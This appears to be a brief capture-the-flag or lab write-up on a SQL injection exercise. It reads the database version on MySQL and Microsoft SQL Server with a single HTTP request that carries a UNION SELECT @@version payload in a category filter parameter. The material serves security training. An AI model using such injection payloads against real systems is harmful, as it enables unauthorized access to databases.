# **Querying the database type and version on MySQL and Microsoft**

This was easier, previous information and familiarity with MySQL, solution:

```
GET /filter?category=Pets'+union+select+%40%40version,"column"+--+- HTTP/2
```
